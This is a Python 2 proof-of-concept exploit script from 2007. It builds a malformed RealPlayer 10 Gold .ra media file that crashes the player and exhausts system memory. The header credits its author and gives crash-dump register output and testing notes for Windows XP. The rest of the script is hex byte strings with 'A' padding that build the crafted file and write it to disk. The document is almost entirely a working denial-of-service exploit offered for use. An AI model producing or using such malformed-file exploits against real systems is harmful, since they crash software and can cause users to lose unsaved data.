#!/usr/bin/python
###
#*Real player 10 Gold .Ra file remote Dos. 
#Credits to n00b for finding this bug
#This bug is a nasty memory leak with in
#Real player 10 gold please remember if 
#your guna test it out save all your info
#you need first..Coz your probly guna have 
#to reboot also remember all other applications
#will be deprived of page memory so other 
#applications might fail upon execution
###
#Tested: On win xp sp 1 / sp 2.
################################################################################
#Pf usage will go from around 120mb-1.40gb
#I've provided the following debug info also
#What i could collect from the crash dump..
#No vital memory address where over written 
#Just a nasty memory leak.
################################################################################
#Executable search path is: 
#Windows XP Version 2600 (Service Pack 2) UP Free x86 compatible
#Product: WinNt, suite: SingleUserTS Personal
#Debug session time: Sun Apr 29 13:45:27.000 2007 (GMT-7)
#System Uptime: 0 days 0:47:42.649
#Process Uptime: 0 days 0:01:39.000
################################################################################
#This dump file has an exception of interest stored in it.
#The stored exception information can be accessed via .ecxr.
#(420.4a0): Access violation - code c0000005 (first/second chance not available)
#eax=00000001 ebx=00000000 ecx=00000000 edx=00780764 esi=00785110 edi=6334def8
#eip=632164b5 esp=0012ddc8 ebp=0012dfdc iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
#rput3260+0x64b5:
#632164b5 8b11            mov     edx,dword ptr [ecx]  ds:0023:00000000=????????
################################################################################
#Seams like another memory leak in real-player 10 gold fully patched.
#Im not relying on the debug-info as i had to reboot at crash time
#Vist us at http://blackhat-forums.com/.
################################################################################


import sys
import struct
import time

print"#########################################################################"
print"           n00b is credited for find this bug and writing poc.           "
print"#########################################################################"
print"#                Real player 10 gold .Ra file dos exploit               #"
print"#                      Shouts to every one at milw0rm                   #"
print"#                          =======================                      #"
print"#                            Date :Aprill 29 2007                       #"
print"#                                                                       #"
print"#                Shouts to marsu your doing a excellent job             #"
print"#########################################################################"
print""
print"Special thanks to str0ke"
print""
print"Please wait your file is being created"

time.sleep (2.0)

################################################################################

Main_Header  = "\x2e\x52\x4d\x46\x00\x00\x00\x12\x00\x01\x00\x00\x00\x00\x00\x00"
Main_Header += "\x00\x06\x50\x52\x4f\x50\x00\x00\x00\x32\x00\x00\x00\x00\xfa\x53"
Main_Header += "\x00\x00\xfa\x53\x00\x00\x02\xe8\x00\x00\x02\xe8\x00\x00\x00\x3c"
Main_Header += "\x00\x00\x10\xe4\x00\x00\x07\x41\x00\x00\xb3\xee\x00\x00\x02\xac"
Main_Header += "\x00\x02\x00\x0d\x0a\x4d\x44\x50\x52\x00\x00\x00\xa4\x00\x00\x00"
Main_Header += "\x00\x00\x00\xfa\x53\x00\x00\xfa\x53\x00\x00\x02\xe8\x00\x00\x02"
Main_Header += "\xe8\x00\x00\x00\x00\x00\x00\x07\x41\x00\x00\x15\xfd\x0c\x41\x75"
Main_Header += "\x64\x69\x6f\x20\x53\x74\x72\x65\x61\x6d\x14\x61\x75\x64\x69\x6f"
Main_Header += "\x2f\x78\x2d\x70\x6e\x2d\x72\x65\x61\x6c\x61\x75\x64\x69\x6f\x00"
Main_Header += "\x00\x00\x56\x2e\x72\x61\xfd\x00\x05\x00\x00\x2e\x72\x61\x35\x66"
Main_Header += "\x05\x63\xd7\x00\x05\x00\x00\x00\x46\x00\x0e\x00\x00\x02\xe8\x00"
Main_Header += "\x00\xae\x60\x00\x07\x55\x6d\x00\x00\x00\x00\x00\x14\x02\xe8\x00"
Main_Header += "\xba\x00\x00\x00\x00\xac\x44\x00\x00\xac\x44\x00\x00\x00\x10\x00"

################################################################################

Mid_Header =   "\x01\x67\x65\x6e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Mid_Header +=  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Mid_Header +=  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Mid_Header +=  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00\x00\x00"
Mid_Header +=  "\x00\x62\x1f\xc1\x42\x37\xc5\x7f\xd8\xaa\x9b\x59\x89\x0d\x91\xbb"
Mid_Header +=  "\xcd\x29\x32\xb4\xb0\xd9\x30\x0f\x05\x08\x5e\x2b\x3f\x60\x23\x43"
Mid_Header +=  "\xe2\xf3\x82\x96\x81\xfe\xa4\x83\x8e\x2b\x32\x09\x1a\x21\x1e\xc9"
Mid_Header +=  "\x8d\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"

################################################################################

Junk_Header =  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
Junk_Header += "\x41\x41\x00\x37\xc5\x11\xf2\x37\xc5\x11\xf2\x37\xc5\x11\xf2\x37"

################################################################################

Tail_Header =  "\xc5\x49\x4e\x44\x58\x00\x00\x00\x3e\x00\x00\x00\x00\x00\x03\x00"
Tail_Header += "\x00\x00\x00\xb4\x2c\x00\x00\x00\x00\x00\x5c\x00\x00\x02\xbe\x00"
Tail_Header += "\x00\x00\x00\x00\x00\x00\x00\x07\x8c\x00\x00\x3d\xce\x00\x00\x00"
Tail_Header += "\x14\x00\x00\x00\x00\x0e\xbc\x00\x00\x78\xde\x00\x00\x00\x28\x49"
Tail_Header += "\x4e\x44\x58\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x00"
Tail_Header += "\x00\x00\x00\x00"


n00b_file = open("Realplayerdos.ra","wb")
n00b_file.write(Main_Header)
time.sleep (1.0)
n00b_file.write(Mid_Header)
time.sleep (1.0)
n00b_file.write(Junk_Header)
time.sleep (1.0)
n00b_file.write(Tail_Header)
n00b_file.close()
print"File was created."
